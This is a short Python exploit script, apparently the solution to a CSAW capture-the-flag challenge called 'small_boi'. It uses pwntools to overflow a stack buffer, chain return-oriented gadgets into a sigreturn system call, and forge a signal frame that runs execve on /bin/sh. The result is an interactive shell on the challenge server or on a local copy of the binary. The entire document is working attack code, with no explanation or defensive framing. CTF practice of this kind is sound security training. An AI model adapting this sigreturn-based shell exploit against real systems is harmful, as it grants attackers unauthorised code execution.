#!/usr/bin/python
import sys
from pwn import *

context.arch = "amd64"

# Connection Info
host = 'pwn.chal.csaw.io'
port = 1002

# Gadgets
pop_rax    = 0x000000000040018a
pop_rbp    = 0x0000000000400188
syscall    = 0x0000000000400185

# Addresses
binsh   = 0x4001ca

# Exploit Function
def exploit(conn):
    # Setup a Sigreturn frame which will execute /bin/sh when sigreturn is called
    frame = SigreturnFrame()
    frame.rax = 59 # execve system call
    frame.rdi = binsh # first parameter, "filename"
    frame.rip = syscall
    payload = "A"*40 # Smash the stack
    payload += p64( pop_rax )
    payload += p64( 15 ) # sigreturn system call
    payload += p64( syscall )
    payload += str( frame )
    conn.sendline( payload )
    conn.interactive()

if __name__=="__main__":
    if len(sys.argv) > 1:
        #conn = remote('localhost', 4444)
        conn = process('./small_boi')
        exploit(conn)
    else:
        conn = remote(host, port)
        exploit(conn)
